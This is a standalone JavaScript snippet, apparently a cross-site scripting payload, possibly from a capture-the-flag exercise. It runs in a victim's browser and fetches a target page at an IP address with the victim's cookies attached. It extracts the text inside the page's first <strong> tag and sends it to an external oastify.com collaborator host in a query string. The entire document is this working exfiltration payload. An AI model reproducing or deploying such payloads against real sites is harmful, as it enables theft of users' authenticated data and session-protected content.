<script>
const fetchOptions = {
  credentials: 'include', // Include credentials (e.g., cookies) in the request
  method: "get"
};

fetch('http://178.62.4.125:32052', fetchOptions)
  .then(response => response.text())
  .then(html => {
    // Extract the <strong> content
    const strongContent = extractStrongContent(html);

    // Fetch another URL with the strongContent
    const secondUrl = 'http://7ltdeyykbt2bm89okucw7dsew52wqmeb.oastify.com?strong=' + encodeURIComponent(strongContent);
    fetch(secondUrl, fetchOptions)
      .then(response => response.text())
      .then(result => {
        console.log('Result:', result);
      })
      .catch(error => {
        console.log('An error occurred while fetching the second URL:', error);
      });
  })
  .catch(error => {
    console.log('An error occurred while fetching the first URL:', error);
  });

function extractStrongContent(html) {
  // Use regular expression to extract the content between <strong> tags
  const strongRegex = /<strong>([\s\S]*?)<\/strong>/i;
  const match = html.match(strongRegex);
  if (match && match[1]) {
    return match[1];
  } else {
    return '';
  }
}

</script>
